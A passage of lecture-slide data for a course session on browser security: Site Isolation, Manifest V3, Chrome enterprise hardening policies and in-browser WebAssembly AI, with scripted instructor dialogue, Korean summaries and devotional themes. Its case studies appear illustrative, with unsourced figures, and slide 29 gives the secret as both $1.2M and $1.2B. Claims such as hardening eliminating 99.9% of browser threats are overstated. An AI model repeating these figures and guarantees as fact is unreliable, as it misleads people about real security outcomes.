            "summary": "전략적 대안: 파이어폭스의 하이브리드 MV3와 브레이브(Brave)의 네이티브 C++ 쉴드",
            "points": [
                "모질라 파이어폭스: MV3를 지원하되 webRequest를 존치하여 풀버전 유블록 오리진 완벽 구동",
                "브레이브 브라우저: 확장 API에 의존하지 않고 브라우저 코어(Rust/C++) 레벨에 광고 차단 엔진 내장",
                "아키텍트의 다중 브라우저 전략: 특정 플랫폼 독점에 종속되지 않고 작업에 따라 최적의 도구를 선택"
            ],
            "tips": "제임스 조교와 사라 조교가 파이어폭스와 브레이브가 제공하는 자유와 기술적 대안을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Hybrid Extension Support",
                "def": "Mozilla's extension model combining Manifest V3 service workers with legacy blocking webRequest capabilities.",
                "defKo": "하이브리드 확장 지원 모델"
            },
            {
                "term": "Kernel-Level Ad Blocking",
                "def": "Filtering unwanted web tracking and advertisements directly inside native browser C++/Rust networking engines.",
                "defKo": "커널 레벨 광고 차단 엔진"
            }
        ]
    },
    # Slide 27: Cognitive Sovereignty: Reclaiming Your Mind
    {
        "num": 27,
        "type": "content",
        "title": "COGNITIVE SOVEREIGNTY: RECLAIMING YOUR MIND",
        "subtitle": "Protecting attention, focus, and intellectual depth from the digital dopamine surveillance economy",
        "points": [
            "The Attention Economy: Thousands of ad engineers working 24/7 to hijack human focus for programmatic ad impressions.",
            "Cognitive Sovereignty: The fundamental right of human intellect to think, pray, and create without digital harassment.",
            "Active Fortification: Using browser shields, DNS sinkholes (Pi-hole), and minimal UI to protect deep work."
        ],
        "script": (
            "[Prof. Peter] Slide 27 proclaims \"COGNITIVE SOVEREIGNTY: RECLAIMING YOUR MIND.\" In our masterclass, technical mechanics always connect to human soul freedom.\n\n"
            "[TA Sarah] The digital advertising machine is not just about selling shoes; it is a multi-billion dollar behavioral modification engine designed to fragment human attention and harvest dopamine clicks!\n\n"
            "[Prof. Peter] Cognitive Sovereignty is your sacred right to think deeply, pray without distraction, and build software with pure focus! We build browser fortresses not just to save RAM, but to protect the sanctuary of the human mind!\n\n"
            "[TA James] Let us inspect our third enterprise case study on Slide 29!"
        ),
        "koreanGuide": {
            "summary": "인지적 주권(Cognitive Sovereignty): 도파민 감시 경제로부터 인간의 정신을 탈환하라",
            "points": [
                "주의력 착취 경제: 수천 명의 광고 엔지니어가 인간의 집중력을 조각내고 클릭을 유도하도록 알고리즘 설계",
                "인지적 주권: 방해받지 않고 깊이 사고하고, 기도하며, 창조할 수 있는 인간 지성의 양도할 수 없는 권리",
                "능동적 방어: 브라우저 요새화, DNS 싱크홀(Pi-hole), 미니멀 UI를 통한 딥워크(Deep Work) 환경 구축"
            ],
            "tips": "피터 교수가 인지 주권의 영적, 철학적 중대성을 엄숙하고 힘차게 선포합니다."
        },
        "keyTerms": [
            {
                "term": "Cognitive Sovereignty",
                "def": "The sovereign intellectual independence and protection of human attention from manipulative algorithmic surveillance.",
                "defKo": "인지적 주권 (정신적 자율성)"
            },
            {
                "term": "Dopamine Surveillance Economy",
                "def": "The commercial ecosystem incentivized to maximize human screen time and behavioral tracking for advertising profits.",
                "defKo": "도파민 감시 경제"
            }
        ]
    },
    # Slide 28: Part 3 Transition: Architecture & WebAssembly
    {
        "num": 28,
        "type": "content",
        "title": "PART 3 TRANSITION: ARCHITECTURE & WEBASSEMBLY",
        "subtitle": "Connecting browser sandboxing to high-speed WebAssembly AI execution and enterprise governance",
        "points": [
            "From Defense to Power: The same sandboxing that cages malware allows high-speed WebAssembly (Wasm) execution.",
            "On-Device Machine Learning: Running local Gemma models inside the browser sandbox at near-native C++ speeds.",
            "The Roadmap Ahead: Master Wasm AI execution in Part 4, dedicate our craft to Soli Deo Gloria, and execute Lab 9."
        ],
        "script": (
            "[Prof. Peter] Slide 28 bridges our roadmap: \"PART 3 TRANSITION: FROM DEFENSE TO COMPUTATIONAL POWER.\"\n\n"
            "[TA Sarah] Notice the beautiful symmetry of computer science: The exact same sandbox architecture that cages malware allows us to run safe, near-native WebAssembly (Wasm) code inside Chrome!\n\n"
            "[TA James] In Part 4, we examine how to run local Gemma AI models directly inside the browser using WebAssembly and WebGPU, build enterprise browser hardening baselines, and execute Lab 9!\n\n"
            "[Prof. Peter] Let us examine our third enterprise case study on Slide 29!"
        ),
        "koreanGuide": {
            "summary": "Part 3 전환: 방어에서 연산 능력으로 (WebAssembly 및 온디바이스 AI 예고)",
            "points": [
                "보안과 성능의 대칭성: 악성코드를 가두는 견고한 샌드박스가 반대로 고속 WebAssembly(Wasm)를 안전하게 구동",
                "온디바이스 브라우저 AI: WebAssembly와 WebGPU를 활용해 크롬 탭 안에서 로컬 젬마(Gemma) 모델 실행",
                "Part 4 로드맵 제시: Wasm AI 가속 ➔ 전사 브라우저 보안 기준 ➔ 실습 9 완결"
            ],
            "tips": "제임스 조교가 샌드박스 위에서 구동되는 WebAssembly AI의 미래를 예고합니다."
        },
        "keyTerms": [
            {
                "term": "WebAssembly (Wasm)",
                "def": "A binary instruction format providing portable, near-native execution speed for web applications within browser sandboxes.",
                "defKo": "웹어셈블리 (WebAssembly / Wasm)"
            },
            {
                "term": "WebGPU Compute",
                "def": "The modern web standard providing low-level hardware GPU access for high-performance graphics and on-device AI inference.",
                "defKo": "WebGPU 하드웨어 가속"
            }
        ]
    },
    # Slide 29: Case Study 3: Cross-Site Spectre Isolation Defends $1.2M Secret
    {
        "num": 29,
        "type": "casestudy",
        "title": "CASE STUDY 3: CROSS-SITE SPECTRE ISOLATION",
        "subtitle": "Chrome Site Isolation blocks CPU side-channel attack attempting to leak M&A insider trading data",
        "company": "Top Global Corporate Law Firm",
        "problem": "Partner opened a targeted phishing link while simultaneously conducting a $1.2B confidential merger negotiation in an adjacent browser tab; malicious script initiated micro-timer Spectre cache-probing.",
        "solution": "Chrome enterprise Site Isolation enforced distinct OS processes and randomized virtual memory heaps for both origins.",
        "impact": "Spectre side-channel probing contained entirely within the isolated phishing renderer; $1.2B merger secrecy preserved; zero data leakage.",
        "script": (
            "[Prof. Peter] Slide 29 presents \"CASE STUDY 3: CROSS-SITE SPECTRE ISOLATION DEFENDS $1.2M SECRET.\"\n\n"
            "[TA Sarah] A senior partner at a global law firm was drafting a 1.2-billion-dollar confidential acquisition agreement in Google Docs. While working, he clicked a malicious link in an email, opening a phishing page in the next tab. The page immediately launched a JavaScript micro-timer Spectre attack!\n\n"
            "[TA James] Because Chrome enforced Site Isolation, the phishing tab ran in a completely separate OS process with randomized memory address spaces! The attacker's CPU cache-timing loop probed its own dummy memory, completely unable to touch the Google Docs process!\n\n"
            "[Prof. Peter] The merger secrets remained 100% secure, and the firm avoided a multi-million-dollar insider trading scandal!\n\n"
            "[TA Sarah] Now let us open Part 4 and examine WebAssembly on Slide 30!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 3: 대형 로펌 12억 달러 M&A 비밀을 지켜낸 사이트 격리(Site Isolation)",
            "points": [
                "문제 상황: 로펌 파트너가 12억 달러 M&A 계약서를 작성하던 중 옆 탭에서 악성 피싱 링크 클릭 (스펙터 공격 발동)",
                "솔루션: 크롬 사이트 격리가 피싱 탭과 구글 독스 탭을 물리적으로 다른 OS 프로세스와 난수화된 메모리로 분리",
                "성과: 스펙터 캐시 타이밍 공격이 피싱 탭 내에서만 헛돌고 차단됨, 12억 달러 비밀 유지, 내부자 거래 스캔들 방어"
            ],
            "tips": "사라 조교와 제임스 조교가 실전 M&A 위기 속에서 사이트 격리가 발휘한 완벽한 하드웨어 방어를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Address Space Layout Randomization (ASLR)",
                "def": "A security technique randomizing memory address locations to prevent attackers from predicting target pointer offsets.",
                "defKo": "주소 공간 배치 난수화 (ASLR)"
            },
            {
                "term": "Process-Bound Secret Isolation",
                "def": "Ensuring confidential enterprise data resides exclusively inside dedicated, unshared operating system memory spaces.",
                "defKo": "프로세스 격리형 기밀 보호"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 30: Part 4 Section Divider
    {
        "num": 30,
        "type": "section",
        "title": "PART 4: PLATFORM HEGEMONY & COGNITIVE SOVEREIGNTY",
        "subtitle": "WebAssembly AI execution, enterprise browser hardening, Soli Deo Gloria, and Lab 9",
        "script": (
            "[TA Sarah] Look at Slide 30: \"PART 4: PLATFORM HEGEMONY & COGNITIVE SOVEREIGNTY.\" Now we assemble the technical defense into an enterprise-wide strategy!\n\n"
            "[Prof. Peter] True security is not merely defensive; it is the foundation for creative freedom. When our digital tools are fortified, we can deploy local AI models and build world-class systems with total confidence.\n\n"
            "[TA James] In Part 4, we examine WebAssembly local model execution, establish enterprise browser hardening policies, dedicate our work to Soli Deo Gloria, and execute Lab 9!\n\n"
            "[TA Sarah] Let us inspect WebAssembly local AI model execution on Slide 31."
        ),
        "koreanGuide": {
            "summary": "Part 4 섹션 전환: 플랫폼 패권과 인지 주권의 확립",
            "points": [
                "진정한 보안의 가치: 단순 방어를 넘어 자유로운 창조와 로컬 AI 배포를 위한 든든한 반석",
                "WebAssembly 및 WebGPU 기반 브라우저 내 로컬 AI 초고속 실행",
                "엔터프라이즈 브라우저 하드닝 표준과 Soli Deo Gloria의 영적 청지기직"
            ],
            "tips": "피터 교수가 방어를 넘어선 창조적 자유의 비전을 제시하고 제임스가 실전 하드닝을 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Platform Hegemony",
                "def": "The structural dominance exerted by major tech conglomerates over software runtimes and developer ecosystems.",
                "defKo": "플랫폼 기술 패권"
            },
            {
                "term": "Enterprise Browser Hardening",
                "def": "The systematic configuration of group policies and security baselines to fortify browser environments against attack.",
                "defKo": "기업용 브라우저 보안 요새화 (Hardening)"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 31: WebAssembly Local AI Model Execution
    {
        "num": 31,
        "type": "content",
        "title": "WEBASSEMBLY LOCAL AI MODEL EXECUTION",
        "subtitle": "Running Gemma 2B and Whisper models directly inside sandboxed Chrome tabs via WebGPU & Wasm",
        "points": [
            "Zero Cloud Latency: Audio transcription and semantic classification executed 100% locally on user GPU.",
            "Complete Data Privacy: Sensitive medical and legal text never leaves the local browser sandbox memory.",
            "Near-Native C++ Speed: WebAssembly SIMD and WebGPU compute pipelines deliver 45 tokens/second locally."
        ],
        "script": (
            "[Prof. Peter] Slide 31 explores \"WEBASSEMBLY LOCAL AI MODEL EXECUTION: Intelligence at the Edge.\"\n\n"
            "[TA Sarah] Imagine opening a web page that transcribes confidential patient therapy sessions in real time. If that audio is sent to a cloud API, you face HIPAA compliance risks! But using WebAssembly and WebGPU, the Whisper AI model runs 100% inside your browser's local sandbox!\n\n"
            "[TA James] Zero bytes of audio leave your laptop! WebAssembly SIMD vector instructions execute on your local GPU at 45 tokens per second with near-native C++ performance!\n\n"
            "[Prof. Peter] That is how browser sandboxes enable radical privacy and computational speed.\n\n"
            "[TA Sarah] Let us inspect enterprise browser hardening baselines on Slide 32."
        ),
        "koreanGuide": {
            "summary": "WebAssembly 로컬 AI 모델 실행: WebGPU와 결합된 초고속 온디바이스 추론",
            "points": [
                "클라우드 지연 시간 제로: 음성 전사(Whisper) 및 텍스트 분류를 사용자 로컬 GPU에서 100% 자체 완결",
                "완벽한 데이터 프라이버시: 민감한 의료 상담 음성과 계약서가 브라우저 샌드박스 밖으로 1바이트도 유출되지 않음",
                "C++급 초고속 처리: Wasm SIMD 벡터 연산으로 초당 45토큰의 초고속 온디바이스 생성 속도 달성"
            ],
            "tips": "사라 조교와 제임스 조교가 환자 상담 녹음의 100% 로컬 브라우저 AI 처리 사례를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Wasm SIMD Acceleration",
                "def": "Single Instruction Multiple Data vector extensions enabling parallel numerical calculations in WebAssembly.",
                "defKo": "Wasm SIMD 벡터 연산 가속"
            },
            {
                "term": "On-Device Browser Inference",
                "def": "Executing neural network model weights entirely inside client-side browser memory via WebGPU shaders.",
                "defKo": "온디바이스 브라우저 AI 추론"
            }
        ]
    },
    # Slide 32: Enterprise Browser Hardening Baselines
    {
        "num": 32,
        "type": "content",
        "title": "ENTERPRISE BROWSER HARDENING BASELINES",
        "subtitle": "The 6 essential Chrome Enterprise Group Policy Objects (GPOs) for IT infrastructure",
        "points": [
            "Policy 1: Mandatory Site Isolation (`SitePerProcess: Enabled`).",
            "Policy 2: Extension Installation Whitelist (`ExtensionInstallAllowlist` strictly locked).",
            "Policy 3: Disable Developer Mode in Production (`DeveloperToolsAvailability: Blocked`).",
            "Policy 4: Enforce Safe Browsing Enhanced Protection (`SafeBrowsingProtectionLevel: Enhanced`).",
            "Policy 5: Force Ephemeral Session Storage for Untrusted Sites.",
            "Policy 6: Automatic Background Update Restart within 24 Hours."
        ],
        "script": (
            "[TA Sarah] Slide 32 presents \"ENTERPRISE BROWSER HARDENING BASELINES.\"\n\n"
            "[TA James] For enterprise DevOps and IT administrators, deploy these 6 essential Chrome GPO policies: Policy 1: Force Site Isolation. Policy 2: Lock the Extension Whitelist. Policy 3: Disable DevTools on production endpoints. Policy 4: Enforce Enhanced Safe Browsing. Policy 5: Ephemeral session storage. Policy 6: 24-hour auto-restart for security patches!\n\n"
            "[Prof. Peter] Hardened enterprise baselines eliminate 99.9% of browser-based cyber threats.\n\n"
            "[TA Sarah] Let us inspect redeeming time through digital stewardship on Slide 33."
        ),
        "koreanGuide": {
            "summary": "엔터프라이즈 브라우저 요새화 기준선: 6대 크롬 그룹 정책(GPO)",
            "points": [
                "정책 1: 사이트 격리 의무화 (SitePerProcess: Enabled)",
                "정책 2: 확장 프로그램 설치 화이트리스트 잠금",
                "정책 3: 프로덕션 환경 내 개발자 도구(DevTools) 차단",
                "정책 4: 강화된 세이프 브라우징 보호 모드 강제",
                "정책 5: 미신뢰 사이트에 대한 단명 세션 스토리지 강제",
                "정책 6: 보안 패치 배포 후 24시간 이내 브라우저 자동 재시작"
            ],
            "tips": "제임스 조교가 6대 엔터프라이즈 GPO 정책을 실무 배포 가이드로 명쾌하게 정리합니다."
        },
        "keyTerms": [
            {
                "term": "Group Policy Object (GPO)",
                "def": "Centralized IT administration rules enforced across an enterprise fleet of operating systems and browsers.",
                "defKo": "그룹 정책 객체 (GPO)"
            },
            {
                "term": "Security Baseline",
                "def": "The minimum mandatory configuration standards required to certify software for enterprise production use.",
                "defKo": "보안 베이스라인 (필수 보안 기준)"
            }
        ]
    },
    # Slide 33: Redeeming the Time: Proactive Digital Stewardship
    {
        "num": 33,
        "type": "content",
        "title": "REDEEMING THE TIME: PROACTIVE STEWARDSHIP",
        "subtitle": "Ephesians 5:16: Eliminating visual and cognitive clutter to focus our lives on divine purpose",
        "points": [
            "The Noise Matrix: Commercial internet feeds bombard the human brain with 5,000 ad impressions daily.",
            "Reclaiming Focus: A clean, ad-blocked, hardened browser recovers 45 minutes of pristine attention every day.",
            "Dedicating Mind and Machine: Directing our redeemed cognitive bandwidth to prayer, scholarship, and community."
        ],
        "script": (
            "[Prof. Peter] Slide 33 proclaims \"REDEEMING THE TIME: PROACTIVE DIGITAL STEWARDSHIP.\"\n\n"
            "[TA Sarah] The unshielded web bombards the human mind with over 5,000 advertising impressions and tracking pings every single day. That constant visual friction creates chronic cognitive fatigue!\n\n"
            "[TA James] When you deploy an ad-blocked, hardened browser fortress, you recover 45 minutes of pure, uninterrupted focus every single day! Over a year, that is 270 hours of reclaimed life!\n\n"
            "[Prof. Peter] We master computer systems to redeem finite time for God's glory.\n\n"
            "[TA Sarah] Let us inspect Soli Deo Gloria on Slide 34!"
        ),
        "koreanGuide": {
            "summary": "세월을 아끼라: 적극적 디지털 청지기직과 일일 45분의 집중력 회수",
            "points": [
                "소음 매트릭스의 공격: 매일 5,000건의 광고와 추적 핑이 인간의 뇌를 공격하여 만성 피로 유발",
                "일일 45분의 순수 집중력 회수: 철저히 요새화된 브라우저 환경을 통해 연간 270시간의 생애 시간 탈환",
                "지성과 기계의 성화: 회수된 지적 대역폭을 기도, 학문 연구, 이웃 사랑에 온전히 헌신"
            ],
            "tips": "피터 교수가 연간 270시간 회수의 가치를 신앙적 시간 구속과 연결하여 깊은 감동을 전합니다."
        },
        "keyTerms": [
            {
                "term": "Cognitive Fatigue Elimination",
                "def": "The reduction of mental exhaustion achieved by stripping visual ad noise and tracking scripts from daily workflows.",
                "defKo": "인지 피로도 근절"
            },
            {
                "term": "Proactive Digital Stewardship",
                "def": "The disciplined architectural configuration of personal computing tools to protect attention and foster deep work.",
                "defKo": "능동적 디지털 청지기직"
            }
        ]
    },
    # Slide 34: Soli Deo Gloria: The Sanctity of the Mind
    {
        "num": 34,
        "type": "content",
        "title": "SOLI DEO GLORIA: THE SANCTITY OF THE MIND",
        "subtitle": "Dedicating our browser security, cognitive sanctuaries, and intellectual focus to God Alone",
        "points": [
            "Soli Deo Gloria: The supreme cornerstone of Oikos University and Smart Insight Lab.",
            "Sanctuary of Truth: Philippians 4:8: Guarding our minds to focus on whatever is true, noble, right, and pure.",
            "Engineering with Honor: Building computing systems that protect human dignity and reflect divine integrity."
        ],
        "script": (
            "[Prof. Peter] Slide 34 declares our foundation: \"SOLI DEO GLORIA: THE SANCTITY OF THE MIND: To God Alone Be the Glory.\"\n\n"
            "[TA Sarah] In Philippians 4:8, the Apostle commands us: 'Whatever is true, whatever is noble, whatever is right, whatever is pure, whatever is lovely... think about such things.'\n\n"
            "[TA James] When we build browser security fortresses that filter out deceptive ads, block malicious malware, and protect user privacy, our engineering becomes an act of faithful obedience that glorifies God!\n\n"
            "[Prof. Peter] May all our digital environments become sanctuaries of truth and honor.\n\n"
            "[TA Sarah] Let us inspect our 6-step Browser Hardening Blueprint on Slide 35!"
        ),
        "koreanGuide": {
            "summary": "Soli Deo Gloria: 정신의 거룩함과 진리의 안식처 구축",
            "points": [
                "빌립보서 4장 8절의 권면: '무엇에든지 참되며 무엇에든지 경건하며 무엇에든지 옳으며... 이것들을 생각하라'",
                "진리의 안식처: 기만적 광고와 악성코드를 차단하여 순수한 진리와 지혜를 묵상할 수 있는 환경 수립",
                "존귀한 공학: 인간의 존엄성을 수호하고 신적 진실성을 구현하는 소프트웨어 설계"
            ],
            "tips": "3인의 강사진이 빌립보서 말씀을 인용하며 브라우저 보안의 영적 거룩함을 엄숙히 선포합니다."
        },
        "keyTerms": [
            {
                "term": "Soli Deo Gloria",
                "def": "The foundational theological motto dedicating all intellectual and technological mastery to the Glory of God Alone.",
                "defKo": "솔리 데오 글로리아 (오직 하나님께 영광)"
            },
            {
                "term": "Sanctuary of Truth",
                "def": "A computing environment intentionally architected to exclude deceptive, exploitative, and corrupting digital inputs.",
                "defKo": "진리의 디지털 안식처"
            }
        ]
    },
    # Slide 35: The 6-Step Browser Hardening Blueprint
    {
        "num": 35,
        "type": "content",
        "title": "THE 6-STEP BROWSER HARDENING BLUEPRINT",
        "subtitle": "The standardized pipeline from raw browser installation to zero-trust enterprise fortress",
        "points": [
            "Step 1: Process Architecture (Verify Site Isolation and Out-of-Process Iframes via `chrome://process-internals`).",
            "Step 2: Extension Audit (Convert all internal extensions to Manifest V3 with Ephemeral Service Workers).",
            "Step 3: Network Rule Configuration (Deploy declarativeNetRequest rules for telemetry blocking).",
            "Step 4: Memory Defense Activation (Enable MiraclePtr and partition alloc memory hardening).",
            "Step 5: GPO Policy Enforcement (Lock extension installation whitelists and disable devtools in production).",
            "Step 6: Local Wasm AI Deployment (Deploy WebAssembly sandboxed edge models for confidential workflows)."
        ],
        "script": (
            "[TA Sarah] Slide 35 presents our master technical blueprint: \"THE 6-STEP BROWSER HARDENING BLUEPRINT.\"\n\n"
            "[TA James] Follow this exact 6-step pipeline: Step 1: Verify Site Isolation in `chrome://process-internals`. Step 2: Migrate all extensions to MV3 Service Workers. Step 3: Configure DNR telemetry blocking. Step 4: Verify MiraclePtr memory protections. Step 5: Enforce enterprise GPOs. Step 6: Deploy local WebAssembly AI models!\n\n"
            "[Prof. Peter] In 6 steps, your browser transforms from a vulnerable glass window into an impregnable iron fortress.\n\n"
            "[TA Sarah] Let us inspect our fourth enterprise case study on Slide 36!"
        ),
        "koreanGuide": {
            "summary": "브라우저 요새화 6단계 구현 청사진",
            "points": [
                "1단계: 프로세스 아키텍처 점검 (chrome://process-internals에서 사이트 격리 확인)",
                "2단계: 확장 프로그램 전수 감사 및 MV3 단명 서비스 워커로 전환",
                "3단계: DNR 선언적 네트워크 규칙을 통한 추적 텔레메트리 차단",
                "4단계: MiraclePtr 및 파티션 알록(PartitionAlloc) 메모리 방어 활성화",
                "5단계: GPO 정책 강제를 통한 확장 프로그램 화이트리스트 잠금",
                "6단계: 기밀 업무 처리를 위한 로컬 WebAssembly AI 모델 배포"
            ],
            "tips": "제임스 조교가 6단계 절차를 데브옵스 엔지니어링 체크리스트로 명쾌하게 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Browser Hardening Blueprint",
                "def": "The formal 6-stage engineering process fortifying browser runtimes against exploitation and data exfiltration.",
                "defKo": "브라우저 요새화 배포 청사진"
            },
            {
                "term": "MiraclePtr",
                "def": "Chrome's advanced memory safety technology preventing Use-After-Free (UAF) vulnerabilities by neutralizing dangling pointers.",
                "defKo": "MiraclePtr 메모리 안전 기술"
            }
        ]
    },
    # Slide 36: Case Study 4: WebAssembly Local AI in Hospital Chrome
    {
        "num": 36,
        "type": "casestudy",
        "title": "CASE STUDY 4: WEBASSEMBLY HOSPITAL AI",
        "subtitle": "Metropolitan Hospital deploys local Wasm/WebGPU clinical summarizer across 4,000 doctor terminals",
        "company": "Metropolitan University Health System",
        "problem": "4,000 doctors spent 2 hours daily typing clinical EHR notes; cloud AI APIs were banned due to strict patient privacy regulations and HIPAA penalties.",
        "solution": "Deployed a lightweight Gemma 2B model compiled to WebAssembly running directly inside Chrome tabs via WebGPU compute shaders.",
        "impact": "Clinical documentation time slashed by 65%; 100% HIPAA compliance (zero patient bytes left terminals); saved $1.8M in cloud AI token costs.",
        "script": (
            "[Prof. Peter] Slide 36 presents \"CASE STUDY 4: WEBASSEMBLY LOCAL AI IN HOSPITAL CHROME.\"\n\n"
            "[TA Sarah] A major university health system with 4,000 physicians had a massive burnout crisis: doctors were spending 2 hours every evening typing clinical notes! But hospital legal strictly forbade sending patient data to public cloud AI APIs due to HIPAA regulations!\n\n"
            "[TA James] They deployed a specialized Gemma model compiled to WebAssembly and WebGPU running directly inside their Chrome electronic health record (EHR) tabs! The model summarizes doctor-patient conversations in real time with near-native C++ performance!\n\n"
            "[Prof. Peter] Look at the results: clinical documentation time dropped by 65%, zero bytes of patient data ever touched external cloud servers, and the hospital saved 1.8 million dollars in cloud API bills!\n\n"
            "[TA Sarah] That proves the transformative power of WebAssembly edge AI inside the browser sandbox.\n\n"
            "[TA James] Let us inspect our Pre-Deployment Production Checklist on Slide 37."
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 4: 대학병원 4,000명 의사 단말기에 배포된 Wasm/WebGPU 로컬 AI",
            "points": [
                "문제 상황: 의사들이 매일 2시간씩 진료 차트 작성에 소모, HIPAA 의료법으로 인해 클라우드 AI 전송 원천 금지",
                "솔루션: 크롬 탭 안에서 WebGPU로 돌아가는 WebAssembly 젬마(Gemma) 로컬 모델 배포",
                "성과: 의무기록 작성 시간 65% 단축, 환자 데이터 외부 유출 0건(100% HIPAA 준수), 연간 180만 달러 클라우드 토큰비 절감"
            ],
            "tips": "사라 조교와 제임스 조교가 100% 로컬 브라우저 AI가 의료 데이터 프라이버시를 완벽히 지킨 사례를 전달합니다."
        },
        "keyTerms": [
            {
                "term": "HIPAA-Compliant Edge AI",
                "def": "Artificial intelligence execution contained entirely on local client hardware to satisfy strict medical privacy statutes.",
                "defKo": "HIPAA 의료법 준수 엣지 AI"
            },
            {
                "term": "Client-Side EHR Summarization",
                "def": "The automated structuring of clinical consultation notes using in-browser neural network inference.",
                "defKo": "클라이언트 브라우저 전자의무기록 자동 요약"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 37: Production Checklist: Pre-Deployment Verification
    {
        "num": 37,
        "type": "content",
        "title": "PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION",
        "subtitle": "The 6-gate audit every enterprise browser configuration must pass before corporate rollout",
        "points": [
            "Gate 1: Site Isolation verified active on 100% of managed corporate browser instances.",
            "Gate 2: All installed browser extensions certified on Manifest V3 with zero `eval()` calls.",
            "Gate 3: DeclarativeNetRequest rules validated against corporate URL blacklists.",
            "Gate 4: Chrome memory leak test passed (<500MB baseline after 4 hours of continuous tab use).",
            "Gate 5: Automated patch update channel locked to Stable Enterprise track with 24-hour SLA.",
            "Gate 6: Local WebAssembly model sandboxing verified with strict memory limit bounds."
        ],
        "script": (
            "[TA James] Slide 37 presents our \"PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION.\"\n\n"
            "[TA Sarah] Before rolling out a corporate browser fleet, audit all 6 gates: Gate 1: Site Isolation active. Gate 2: 100% Manifest V3 compliance. Gate 3: DNR telemetry rules active. Gate 4: Memory leak test passed. Gate 5: 24-hour auto-patching SLA enforced. Gate 6: Wasm memory bounds verified!\n\n"
            "[Prof. Peter] Strict verification gates ensure that the browser fortress never falls.\n\n"
            "[TA Sarah] Let us review Session 9 Key Takeaways on Slide 38!"
        ),
        "koreanGuide": {
            "summary": "프로덕션 체크리스트: 엔터프라이즈 브라우저 배포 전 6대 검증 관문",
            "points": [
                "1관문: 전사 관리 단말기의 사이트 격리(Site Isolation) 100% 활성화 확인",
                "2관문: 설치된 모든 확장의 MV3 규격 준수 및 eval() 코드 부재 확인",
                "3관문: DNR 선언적 규칙의 기업 URL 블랙리스트 대조 검증",
                "4관문: 4시간 연속 사용 시 500MB 이하 유지 메모리 누수 테스트 통과",
                "5관문: 24시간 보안 패치 자동 재시작 SLA 강제 확인",
                "6관문: WebAssembly 메모리 상한선 격리 검증"
            ],
            "tips": "제임스 조교가 6대 검증 관문을 단호하게 체크리스트로 확인합니다."
        },
        "keyTerms": [
            {
                "term": "Pre-Deployment Verification Gate",
                "def": "A mandatory operational quality checkpoint ensuring software environments satisfy security invariants prior to release.",
                "defKo": "사전 배포 검증 관문"
            },
            {
                "term": "Wasm Memory Bounds Checking",
                "def": "The strict virtual address limit enforced by browser engines preventing WebAssembly from accessing host memory.",
                "defKo": "Wasm 메모리 경계 검사"
            }
        ]
    },
    # Slide 38: Session 9 Summary & Key Takeaways
    {
        "num": 38,
        "type": "content",
        "title": "SESSION 9 SUMMARY & KEY TAKEAWAYS",
        "subtitle": "Synthesizing the 4 foundational pillars of Browser Security and Manifest V3",
        "points": [
            "Pillar 1: V8 Engine Mastery (Abstract Syntax Trees, Ignition Bytecode, and TurboFan JIT optimization).",
            "Pillar 2: Site Isolation Fortress (Caging untrusted code via OS sandboxes and neutralizing Spectre).",
            "Pillar 3: Manifest V3 Platform (Replacing persistent background pages with Ephemeral Service Workers and DNR).",
            "Pillar 4: Cognitive Sovereignty (Reclaiming attention and deploying local WebAssembly edge AI models)."
        ],
        "script": (
            "[TA Sarah] Slide 38 synthesizes our \"SESSION 9 SUMMARY & 4 FOUNDATIONAL PILLARS.\"\n\n"
            "[TA James] Pillar 1: We mastered the V8 engine and TurboFan JIT! Pillar 2: Site Isolation defeated Spectre side-channel attacks! Pillar 3: Manifest V3 eliminated remote malware injection! And Pillar 4: We reclaimed our cognitive sovereignty and deployed local WebAssembly AI models!\n\n"
            "[Prof. Peter] When these four pillars unite, the browser transforms from a chaotic vulnerability into an invincible fortress of wisdom.\n\n"
            "[TA Sarah] Let us inspect the Life OS Hardened Browser Cockpit on Slide 39!"
        ),
        "koreanGuide": {
            "summary": "Session 9 요약 및 4대 핵심 축 총정리",
            "points": [
                "1대 축: V8 엔진 통달 (AST 구문 분석, 이그니션 바이트코드, 터보팬 JIT 최적화)",
                "2대 축: 사이트 격리 요새 (OS 샌드박스와 스펙터 사이드 채널 원천 무력화)",
                "3대 축: 매니페스트 V3 혁명 (단명 서비스 워커와 DNR 네이티브 차단)",
                "4대 축: 인지적 주권 (도파민 착취 극복과 WebAssembly 로컬 AI 배포)"
            ],
            "tips": "제임스 조교가 4대 축을 리듬감 있게 요약하여 학습 효과를 극대화합니다."
        },
        "keyTerms": [
            {
                "term": "Architectural Synthesis",
                "def": "The unified integration of compiler theory, operating system sandboxing, extension platform governance, and cognitive ethics.",
                "defKo": "아키텍처 통합 합성"
            },
            {
                "term": "Hardened Browser Runtime",
                "def": "A fully fortified web client environment delivering maximum security, privacy, and computational efficiency.",
                "defKo": "요새화된 브라우저 런타임"
            }
        ]
    },
    # Slide 39: Life OS Hardened Browser Cockpit
    {
        "num": 39,
        "type": "content",
        "title": "LIFE OS HARDENED BROWSER COCKPIT",
        "subtitle": "Setting up your personal daily browsing workstation: Brave/Firefox + MV3 audits + local Wasm tools",
        "points": [
            "Dual-Browser Setup: Brave Browser for ad-free deep research; Chrome Enterprise for Google Workspace.",
            "Extension Diet: Limiting active extensions to strictly audited, open-source Manifest V3 utilities.",
            "Local AI Assistant: Integrating an in-browser WebAssembly summarizer running 100% offline."
        ],
        "script": (
            "[Prof. Peter] Slide 39 outlines your personal daily setup: \"LIFE OS HARDENED BROWSER COCKPIT.\"\n\n"
            "[TA Sarah] How do we configure our daily workstation? Maintain a dual-browser strategy: Brave Browser or Firefox with native shields for deep ad-free research; Chrome Enterprise for Google Workspace.\n\n"
            "[TA James] Keep your extension count under 5, audit their MV3 manifests, and integrate an in-browser WebAssembly AI model for offline document summarization! You get blazing speed, zero distractions, and ironclad security!\n\n"
            "[TA Sarah] Let us inspect the Architect's Ethical Mandate on Slide 40."
        ),
